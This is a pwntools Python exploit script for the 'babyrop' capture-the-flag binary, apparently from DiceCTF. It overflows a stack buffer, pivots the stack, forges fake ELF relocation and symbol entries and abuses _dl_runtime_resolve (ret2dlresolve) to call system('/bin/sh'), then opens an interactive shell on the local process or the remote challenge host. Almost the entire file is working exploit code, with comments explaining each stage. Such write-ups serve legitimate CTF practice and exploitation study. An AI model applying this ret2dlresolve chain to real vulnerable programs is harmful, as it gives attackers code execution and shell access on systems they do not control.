
from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
exe = '../babyrop'
context.binary = exe # Infer target architecture, bit-with, and endianness from a binary file.

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript, exe, *a, *kw)
    else:
        target = process([exe] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
init-gef
# target record-full # Not supported due to AVX instructions

# break in leave main
b *0x40116a

# break in main
b *0x401136

# break in dl_resolve()
# b *0x401026

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'dicec.tf'
    remote_port = 31924
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

elfexe = ELF(exe)
rdi_gadget = 0x4011d3

write_area = 0x404800
write__got_plt = 0x404018
main = 0x00401136
_dl_runtime_resolve = elfexe.get_section_by_name('.plt').header.sh_addr # stub for _dl_runtime_resolve() is always the first function found in the .plt section

assert(elfexe.address - elfexe.load_addr == 0)
JMPREL = elfexe.dynamic_value_by_tag('DT_JMPREL')
SYMTAB = elfexe.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elfexe.dynamic_value_by_tag('DT_STRTAB')

writeable_address = 0x404f10 # Fake stack area. Must be aligned to 16-byte boundary otherwise we will fail due to moveaps. This is our $rsp

# Set buf to point to writeable_address
io.recvuntil(b'Your name: ')
payload  = b'A'*0x40
payload += p64(writeable_address + 0x40) # rbp
payload += p64(main + 0x1e) # ret to LEA rbp-0x40
payload += b'\n'
io.send(payload)

# Do some real sorcery here. kudos to pwntools for automating this.
# 1. Set up $rdi for the system("/bin/sh") call
# 2. Create fake struct elf64_rela
# 3. Create fake struct elf64_Sym
# 4. Invoke _dl_runtime_resolve() with our fake data
rel_entry_addr = writeable_address + 0x80
rel_offset = ( rel_entry_addr - JMPREL ) // 24
assert(( rel_entry_addr - JMPREL ) % 24 == 0) # rel_offset must be 24-byte aligned
assert(JMPREL + rel_offset*24 == rel_entry_addr)

sym_entry_addr = (rel_entry_addr + 24)
symtab_idx = ( sym_entry_addr - SYMTAB ) // 24
assert(( sym_entry_addr - SYMTAB) % 24 == 0) # symtab_idx must be 24-byte aligned
assert(SYMTAB + symtab_idx*24 == sym_entry_addr)

r_info = (symtab_idx << 32) | (0x7)
system_str_addr = writeable_address + 0xb0
bin_sh_str_adr  = writeable_address + 0xb8
st_name = system_str_addr - STRTAB
assert(STRTAB + st_name == system_str_addr)

log.info('writeable_address: ' + hex(writeable_address))
log.info('rel_offset: ' + hex(rel_offset))
log.info('  - rel_entry expected at : ' + hex(rel_entry_addr))
log.info('symtab_idx: ' + hex(symtab_idx))
log.info('  - st_name for "system" expected at : ' + hex(sym_entry_addr))
log.info('  - value expected to be             : ' + hex(st_name))
log.info('expected "system"  string at: ' + hex(system_str_addr))
log.info('expected "/bin/sh" string at: ' + hex(bin_sh_str_adr))

# Construct the described payload
payload  = b''
payload += b'B'*0x40 # padding since we have to write our stuff bellow the return address
payload += b'C'*0x08 # rbp
payload += p64(rdi_gadget)          # ret. Return to gadget: pop rdi; ret;
payload += p64(bin_sh_str_adr)      # rdi = "/bin/sh\x00"
payload += p64(_dl_runtime_resolve) # ret. Return to stub for _dl_runtime_resolve() (It will also push the 1st argument when executed)
payload += p64(rel_offset)          # 2nd arg of  _dl_runtime_resolve().
payload += b'D'*0x08                # return address of _dl_runtime_resolve(). It shouldn't return as it will invoke system()
payload += b'E'*0x10                # padding to be aligned on 24-byte boundary
payload += (                # Elf64_Rela rel_entry
    p64(write_area)     + # r_offset. Value does not matter as long as we can write there.
    p64(r_info)             + # r_info
    p64(0x0000000000000000)   # r_addend
)
payload += (            # Elf64_Sym sym_entry
    p64(st_name) +      # st_name
    b'\x00'*16
)
payload += b'system\x00\x00'
payload += b'/bin/sh\x00'
payload += b'\n'
io.send(payload)

io.interactive()
io.close()
